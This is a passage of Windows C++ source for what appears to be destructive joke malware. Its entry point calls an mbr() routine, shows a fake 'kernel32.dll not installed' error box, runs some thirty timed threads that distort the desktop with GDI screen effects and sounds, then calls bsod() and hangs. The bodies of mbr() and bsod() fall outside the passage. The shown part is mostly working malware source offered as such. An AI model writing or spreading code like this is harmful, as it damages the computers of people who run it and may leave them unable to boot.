	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		int w = xorshift32() % sh, h = sh / 2 - xorshift32() % sh / 3;
		BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 21 - 10, w, !(xorshift32() % 2) ? SRCAND : SRCPAINT);
		BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 21 - 10, w, SRCCOPY);
		Sleep(1);
		if (xorshift32() % 10 == 3) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload30(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	double moveangle = 0; RECT wRect;
	while (true) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		GetWindowRect(GetDesktopWindow(), &wRect);
		int ax = (int)(cos(moveangle) * 2.0);
		int ay = (int)(sin(moveangle) * 2.0);
		StretchBlt(desk, ax, ay, wRect.right, wRect.bottom, desk, -5, -5, wRect.right + 10, wRect.bottom + 10, SRCCOPY);
		StretchBlt(desk, ax, ay, wRect.right, wRect.bottom, desk, 5, 5, wRect.right - 10, wRect.bottom - 10, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(10);
	}
}
DWORD WINAPI payload31(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {

		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		StretchBlt(hdc, 0, 0, w, h, hdc, rand() % w, rand() % h, w, h, NOTSRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdc, rand() % w, 0 - rand() % h, w, h, NOTSRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdc, 0 - rand() % w, rand() % h, w, h, NOTSRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdc, 0 - rand() % w, 0 - rand() % h, w, h, NOTSRCCOPY);
		SelectObject(hdcMem, hbm);BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		Sleep(rand() % 30);
		if (!i) RedrawWindow(0, 0, 0, 133);
		if (!i) RedrawWindow(0, 0, 0, 133);
		if (!i) RedrawWindow(0, 0, 0, 133);
		if (!i) RedrawWindow(0, 0, 0, 133);
		if (!i) RedrawWindow(0, 0, 0, 133);
		if (!i) RedrawWindow(0, 0, 0, 133);
	}
}

DWORD WINAPI msg(LPVOID lpParam) {
	MessageBox(NULL, L"Application could not started, because kernel32.dll has not installed. Try reinstalling the program.", L"Application error: fakeerrorgetfucked.exe", MB_ICONERROR);
	return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	mbr();
	HANDLE error = CreateThread(0, 0, msg, 0, 0, 0);
	CloseHandle(error);
	Sleep(10000);
	sound1();
	HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
	Sleep(25000);
	TerminateThread(thread1, 0);
	CloseHandle(thread1);
	RedrawWindow(0, 0, 0, 133);
	sound2();
	HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread2, 0);
	CloseHandle(thread2);
	RedrawWindow(0, 0, 0, 133);
	sound3();
	HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
	Sleep(23000);
	TerminateThread(thread3, 0);
	CloseHandle(thread3);
	RedrawWindow(0, 0, 0, 133);
	sound4();
	HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
	Sleep(30000);
	TerminateThread(thread4, 0);
	CloseHandle(thread4);
	RedrawWindow(0, 0, 0, 133);
	sound5();
	HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
	Sleep(25000);
	TerminateThread(thread5, 0);
	CloseHandle(thread5);
	RedrawWindow(0, 0, 0, 133);
	sound6();
	HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread6, 0);
	CloseHandle(thread6);
	RedrawWindow(0, 0, 0, 133);
	sound7();
	HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
	Sleep(25000);
	TerminateThread(thread7, 0);
	CloseHandle(thread7);
	RedrawWindow(0, 0, 0, 133);
	sound8();
	HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread8, 0);
	CloseHandle(thread8);
	RedrawWindow(0, 0, 0, 133);
	sound9();
	HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread9, 0);
	CloseHandle(thread9);
	RedrawWindow(0, 0, 0, 133);
	sound10();
	HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
	Sleep(15000);
	HANDLE thread10dot2 = CreateThread(0, 0, payload10dot2, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread10, 0);
	CloseHandle(thread10);
	TerminateThread(thread10dot2, 0);
	CloseHandle(thread10dot2);
	RedrawWindow(0, 0, 0, 133);
	sound11();
	HANDLE thread11 = CreateThread(0, 0, payload11, 0, 0, 0);
	Sleep(10000);
	TerminateThread(thread11, 0);
	CloseHandle(thread11);
	RedrawWindow(0, 0, 0, 133);
	sound12();
	HANDLE thread12 = CreateThread(0, 0, payload12, 0, 0, 0);
	Sleep(13000);
	TerminateThread(thread12, 0);
	CloseHandle(thread12);
	RedrawWindow(0, 0, 0, 133);
	sound13();
	HANDLE thread13 = CreateThread(0, 0, payload13, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread13, 0);
	CloseHandle(thread13);
	sound14();
	HANDLE thread14 = CreateThread(0, 0, payload14, 0, 0, 0);
	Sleep(19000);
	TerminateThread(thread14, 0);
	CloseHandle(thread14);
	sound15();
	RedrawWindow(0, 0, 0, 133);
	HANDLE thread15 = CreateThread(0, 0, payload15, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread15, 0);
	CloseHandle(thread15);
	RedrawWindow(0, 0, 0, 133);
	sound16();
	HANDLE thread16 = CreateThread(0, 0, payload16, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread16, 0);
	CloseHandle(thread16);
	RedrawWindow(0, 0, 0, 133);
	sound17();
	HANDLE thread17 = CreateThread(0, 0, payload17, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread17, 0);
	CloseHandle(thread17);
	RedrawWindow(0, 0, 0, 133);
	sound18();
	HANDLE thread18 = CreateThread(0, 0, payload18, 0, 0, 0);
	Sleep(25000);
	TerminateThread(thread18, 0);
	CloseHandle(thread18);
	RedrawWindow(0, 0, 0, 133);
	sound19();
	HANDLE thread19 = CreateThread(0, 0, payload19, 0, 0, 0);
	Sleep(25000);
	TerminateThread(thread19, 0);
	CloseHandle(thread19);
	RedrawWindow(0, 0, 0, 133);
	sound20();
	HANDLE thread20 = CreateThread(0, 0, payload20, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread20, 0);
	RedrawWindow(0, 0, 0, 133);
	sound21();
	HANDLE thread21 = CreateThread(0, 0, payload21, 0, 0, 0);
	Sleep(17000);
	TerminateThread(thread21, 0);
	CloseHandle(thread21);
	RedrawWindow(0, 0, 0, 133);
	sound22();
	HANDLE thread22 = CreateThread(0, 0, payload22, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread22, 0);
	CloseHandle(thread22);
	RedrawWindow(0, 0, 0, 133);
	sound23();
	HANDLE thread23 = CreateThread(0, 0, payload23, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread23, 0);
	CloseHandle(thread23);
	sound24();
	HANDLE thread24 = CreateThread(0, 0, payload24, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread24, 0);
	CloseHandle(thread24);
	sound25();
	HANDLE thread25 = CreateThread(0, 0, payload25, 0, 0, 0);
	Sleep(10000);
	TerminateThread(thread25, 0);
	CloseHandle(thread25);
	sound26();
	HANDLE thread26 = CreateThread(0, 0, payload26, 0, 0, 0);
	Sleep(16000);
	TerminateThread(thread26, 0);
	CloseHandle(thread26);
	sound27();
	HANDLE thread27 = CreateThread(0, 0, payload27, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread27, 0);
	CloseHandle(thread27);
	sound28();
	HANDLE thread28 = CreateThread(0, 0, payload28, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread28, 0);
	CloseHandle(thread28);
	sound29();
	HANDLE thread29 = CreateThread(0, 0, payload29, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread29, 0);
	CloseHandle(thread29);
	sound30();
	HANDLE thread30 = CreateThread(0, 0, payload30, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread30, 0);
	CloseHandle(thread30);
	sound31();
	HANDLE thread31 = CreateThread(0, 0, payload31, 0, 0, 0);
	Sleep(25000);
	TerminateThread(thread31, 0);
	CloseHandle(thread31);
	bsod();
	while (1) {}
}